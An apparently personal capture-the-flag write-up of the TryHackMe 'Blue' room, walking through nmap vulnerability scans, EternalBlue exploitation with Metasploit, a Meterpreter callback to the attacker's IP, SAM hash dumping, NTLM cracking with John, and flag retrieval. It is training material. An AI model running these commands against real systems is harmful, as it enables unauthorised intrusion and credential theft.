# BLUE

---

---

---

### 🧠 The Right Mindset for This Room

This room is basically teaching you the pentesting flow:

1. **Recon** → What machine is this?
2. **Enumeration** → What services are open?
3. **Vulnerability check** → Is SMB vulnerable?
4. **Exploit (controlled)** → Gain access
5. **Post-exploitation** → Find the flags / prove access

```jsx
┌──(ayachi㉿kali)-[~]
└─$ nmap -sV -vv --script vuln 10.64.143.177

```

### `-script vuln` means:

> “Run vulnerability detection scripts against the target.”
> 

## Mental model

### Without scripts:

Nmap tells you:

✅ Port 445 open

### With `-script vuln`:

Nmap tells you:

✅ Port 445 open

⚠️ SMB might be vulnerable to MS17-010

results

```jsx
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 126 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped   syn-ack ttl 126
49152/tcp open  unknown      syn-ack ttl 126
49153/tcp open  unknown      syn-ack ttl 126
49154/tcp open  unknown      syn-ack ttl 126
49158/tcp open  unknown      syn-ack ttl 126
49159/tcp open  unknown      syn-ack ttl 126
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT

```

---

# 🔍 Recon & Vulnerability Detection (EternalBlue / MS17-010)

Before attempting any exploitation, the first goal in a pentest is always to understand the target machine:

- What services are running?
- What operating system is it?
- Are there known vulnerabilities?

Since the TryHackMe **Blue** room focuses on the EternalBlue exploit, the first step is proper enumeration.

---

## ✅ Step 1 — Initial Service & Vulnerability Scan

I started with a broad Nmap scan to identify open ports, running services, and potential vulnerabilities:

```
nmap -sV -vv --script vuln TARGET_IP
```

### Why this scan?

This command combines multiple important recon techniques:

- `sV` detects service versions
- `vv` provides more detailed output
- `-script vuln` runs Nmap vulnerability detection scripts

At this stage, I was not trying to exploit anything yet — only to gather information.

---

## ✅ Step 2 — Analyzing the Output

The scan revealed several open ports:

- `135` (MSRPC)
- `139` (NetBIOS)
- `445` (SMB)
- `3389` (RDP)

The most important discovery was:

```
445/tcp open microsoft-ds
```

### Why is port 445 important?

Port **445** indicates that the target is running **SMB (Server Message Block)**, which is a Windows file-sharing protocol.

SMB has historically been a common attack surface for major Windows vulnerabilities.

So at this point, my thinking was:

> SMB is running → I should investigate SMB vulnerabilities further.
> 

---

## ✅ Step 3 — Evidence of SMB Weakness

The vulnerability scripts returned this result:

```
smb-vuln-cve2009-3103: VULNERABLE
```

Even though this was not EternalBlue yet, it confirmed something critical:

- The SMB service is outdated or misconfigured
- The machine is likely vulnerable to known SMB exploits

This reinforced the idea that SMB is the main entry point.

---

## ✅ Step 4 — Narrowing the Focus to EternalBlue (MS17-010)

The Blue room is known for the **EternalBlue vulnerability**, which corresponds to:

- Microsoft bulletin: **MS17-010**
- SMBv1 Remote Code Execution

However, the initial scan did not explicitly confirm MS17-010.

So instead of running another broad scan, the next logical step was to perform a **targeted check** for the EternalBlue vulnerability.

---

## ✅ Step 5 — Targeted MS17-010 Vulnerability Check

Nmap includes a specific script for EternalBlue detection:

```
nmap -p445 --script smb-vuln-ms17-010 TARGET_IP
```

### Why this is better than `-script vuln`

- Faster (only checks port 445)
- More accurate (focuses on one vulnerability)
- Cleaner output

---

## ✅ Step 6 — Confirmation of Vulnerability

The result was clear:

```
smb-vuln-ms17-010:
VULNERABLE:
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
Risk factor: HIGH
```

This confirmed that:

- SMBv1 is enabled
- The machine is vulnerable to EternalBlue
- Remote Code Execution is possible

## Gain Access

first metasploit 

```jsx
msfconsol
```

than serahc for the vuln

```jsx
search ms17_010_eternalblue
```

the exploit path is 

```jsx
exploit/windows/smb/ms17_010_eternalblue
```

- `windows` → Target operating system
- `smb` → Protocol being attacked
- `ms17_010_eternalblue` → Specific vulnerability exploit

## Initial Access: Standard Windows Shell

After exploitation, I received a basic Windows shell:

```
C:\Windows\system32>
```

At this stage, I could run normal Windows commands.

To verify my privilege level, I used:

```
whoami
```

Output:

```
nt authority\system
```

This confirmed that the exploit granted **SYSTEM-level privileges**, meaning full control over the machine.

---

## Understanding Shell vs Meterpreter

Although a basic shell is useful, it is limited.

Metasploit provides a more powerful session type called **Meterpreter**, which supports:

- process migration
- file upload/download
- credential dumping
- post-exploitation modules

So the next goal was to upgrade the shell.

---

## Backgrounding the Shell Session

Before upgrading, I backgrounded the current shell session without closing it:

```
CTRL + Z
```

This returned me to the Metasploit console.

I then listed active sessions:

```
sessions -l
```

This showed:

- Session 1 → standard shell

---

## Upgrading Shell to Meterpreter

Metasploit includes a post-exploitation module for converting shells into Meterpreter sessions:

```
post/multi/manage/shell_to_meterpreter
```

I loaded it using:

```
use post/multi/manage/shell_to_meterpreter
```

---

## Selecting the Session to Upgrade

This module needs the session ID of the existing shell:

```
set SESSION 1
```

---

## Setting Callback Address (LHOST)

Meterpreter needs to connect back to the attacker machine, so I set my VPN IP address:

```
set LHOST 192.168.178.249
```

This ensures the target knows where to send the Meterpreter session.

---

## Running the Upgrade Module

I executed the module:

```
run
```

This successfully created a new Meterpreter session:

```
Meterpreter session 2 opened
```

---

## Interacting with Meterpreter Session

To use the new Meterpreter session:

```
sessions -i 2
```

Prompt changed to:

```
meterpreter >
```

---

## Verifying SYSTEM Access in Meterpreter

Inside Meterpreter, Windows commands like `whoami` do not work directly.

Instead, Meterpreter provides:

```
getuid
```

Output:

```
Server username: NT AUTHORITY\SYSTEM
```

This confirmed that I maintained SYSTEM privileges.

---

## Enumerating Processes

Next, I listed all running processes:

```
ps
```

This displayed process IDs (PIDs) and which user they were running under.

Even though we have SYSTEM privileges, the Meterpreter session runs inside a specific process, which may not be stable.

---

## Process Migration for Stability

To make the session more stable, Meterpreter allows migrating into another trusted SYSTEM process.

The goal is to move into a long-running process such as:

- `spoolsv.exe`
- `services.exe`
- `svchost.exe`

Migration is done using:

```
migrate <PID>
```

This helps prevent losing access if the original exploited process terminates.

---

# ✅ Current Status

At this point, I have achieved:

- Successful EternalBlue exploitation
- SYSTEM-level access
- A fully upgraded Meterpreter session
- Process enumeration
- Preparation for stable post-exploitation through migration

# 🔐 Dumping Password Hashes and Cracking Jon’s NTLM Password (alqfna22)

After successfully exploiting the target and upgrading our shell to a Meterpreter session, the next goal was to extract local Windows credentials. Since Meterpreter gives us SYSTEM-level access, we can directly dump the password hashes stored on the machine.

This is an important post-exploitation step because hashes can often be cracked offline, giving us real plaintext passwords that may be reused for other services (RDP, SMB, lateral movement, etc.).

---

## ✅ Step 1 — Dumping Password Hashes with `hashdump`

Once inside the Meterpreter session, I ran:

```
meterpreter > hashdump
```

This command extracts the local user password hashes from the Windows SAM database.

The output was:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

---

## 🧠 Understanding the Hash Format

Each line follows this structure:

```
Username:RID:LM_Hash:NTLM_Hash:::
```

For example:

```
Jon:1000:LM_HASH:NTLM_HASH
```

---

### 🔸 LM Hash

The value:

```
aad3b435b51404eeaad3b435b51404ee
```

appears for all users and indicates that LM hashing is disabled (common in modern Windows systems).

So the LM hash can be ignored.

---

### 🔸 NTLM Hash (The Important One)

The real password hash for Jon was:

```
ffb43f0de35be4d9917ac0cc8ad57f8d
```

This is the NTLM hash we can attempt to crack.

---

### ⚠ Administrator and Guest Hashes

Both Administrator and Guest had this NTLM hash:

```
31d6cfe0d16ae931b73c59d7e0c089c0
```

This is a well-known hash that means:

✅ The password is blank (empty password)

So the only meaningful account to crack was **Jon**.

---

## ✅ Step 2 — Preparing the Hash for Cracking

To crack Jon’s password, I copied the NTLM hash into a file:

```
nano hash.txt
```

Inside the file:

```
Jon:ffb43f0de35be4d9917ac0cc8ad57f8d
```

Saving it in this format helps John correctly recognize the username and hash.

---

## ✅ Step 3 — Cracking the NTLM Hash with RockYou

Since TryHackMe suggested using the famous `rockyou.txt` wordlist, I ran:

```
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

John loaded the NTLM hash and began testing passwords from the wordlist.

After a short moment, it successfully cracked the password:

```
alqfna22         (Jon)
```

So the plaintext password for Jon was:

> **alqfna22**
> 

---

## ✅ Step 4 — Confirming the Cracked Password

To verify the result, I used:

```
john --show --format=NT hash.txt
```

This confirms the cracked credentials:

```
Jon:alqfna22
```

---

# 🎯 What We Gained From This Step

By dumping and cracking hashes, we achieved a major post-exploitation milestone:

- Extracted NTLM password hashes from the target system
- Successfully cracked Jon’s password offline
- Obtained valid credentials:

```
Jon : alqfna22
```

This is valuable because real passwords can be reused for:

- SMB authentication
- RDP login
- Privilege escalation
- Pivoting to other machines

# Finding and Reading the Flag (Meterpreter File Search)

After successfully gaining a Meterpreter session as **NT AUTHORITY\SYSTEM**, the next objective was to locate the next flag file on the target machine.

Since we are now inside a **Meterpreter session**, we are not using normal Linux commands like `find`. Meterpreter has its own built-in commands designed for post-exploitation.

---

## 🔍 Searching for the Flag File

Instead of manually browsing through directories, Meterpreter provides the `search` command, which allows us to locate files quickly across the Windows filesystem.

For example, to search for the second flag, I used:

```
meterpreter > search -f flag2.txt
```

Meterpreter returned the full location of the file:

```
Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Windows\System32\config\flag2.txt   34            2019-03-17 ...
```

This confirmed exactly where the flag was stored.

---

## 📄 Reading the Flag File

Once the file path was identified, the next step was to read its contents using `cat`:

```
meterpreter > cat c:\Windows\System32\config\flag2.txt
```

At first, I received an error:

```
Operation failed: The system cannot find the file specified.
```

This happened because I accidentally mistyped the path:

```
c:\indows\System32\...
```

Even a single missing character in Windows paths will cause the command to fail.

After correcting the full path, the command worked successfully and displayed the flag.

---

## 🧠 Why Use `search` Instead of `find`?

It’s important to understand that Meterpreter is not a normal Windows command prompt or Linux terminal.

- `find` is a Linux command
- Windows uses different tools (`dir /s`, PowerShell, etc.)
- Meterpreter includes its own post-exploitation command: `search`

So in Meterpreter, the correct approach is:

```
search -f filename.txt
```